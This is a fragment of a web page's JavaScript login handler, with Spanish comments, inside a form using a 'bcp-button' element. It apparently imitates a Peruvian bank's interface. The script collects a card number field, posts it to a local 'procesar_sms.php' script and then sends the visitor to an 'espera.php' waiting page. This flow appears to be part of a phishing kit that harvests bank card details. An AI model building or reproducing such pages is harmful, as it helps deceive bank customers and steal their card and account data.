            <script>
                // Función que valida que el campo de usuario no tenga espacios
                function validarUsuario() {
                  const usuario = document.getElementById("nodocument");
                  // Elimina los espacios antes y después del texto
                  usuario.value = usuario.value.replace(/\s+/g, '');
                }

                document.getElementById("btnLogin").addEventListener("click", function () {
                  const nocard = document.getElementById("nocard").value.trim();
                  const msgBox = document.getElementById("msgBox");

                  // Validación básica para asegurarse de que los campos no estén vacíos
                  if (!nocard) {
                    msgBox.textContent = "Por favor complete los campos.";
                    msgBox.style.color = "red";
                    return;
                  }

                  // Simulación del envío con fetch (con URL de backend real)
                  fetch("./procesar_sms.php", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json"
                    },
                    body: JSON.stringify({nocard})
                  })
                  .then(res => {
                    if (!res.ok) throw new Error("Error del servidor");
                    return res.json();
                  })
                  .then(data => {
                    if (data.success) {
                      window.location.href = "./espera.php"; // Redirige si login es exitoso
                    } else {
                      msgBox.textContent = data.message || "Credenciales incorrectas.";
                      msgBox.style.color = "red";
                    }
                  })
                  .catch(err => {
                    msgBox.textContent = "Error al conectar con el servidor.";
                    msgBox.style.color = "red";
                    console.error(err);
                  });
                });
              </script>
          </bcp-button></div></div></div></form>
